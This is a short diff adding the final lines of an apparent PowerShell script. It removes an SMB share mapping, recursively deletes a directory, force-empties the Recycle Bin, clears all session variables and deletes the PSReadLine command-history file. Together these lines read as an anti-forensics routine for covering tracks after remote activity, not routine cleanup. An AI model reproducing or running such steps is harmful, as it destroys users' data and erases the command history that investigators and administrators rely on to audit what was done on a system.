@@ -1,0 +1,11 @@
+Remove-SmbMapping -RemotePath "\\$h\$share" -Force
+
+Remove-Item $dir -Recurse
+
+Clear-RecycleBin -Force
+
+Remove-Variable * -ErrorAction SilentlyContinue
+
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+exit
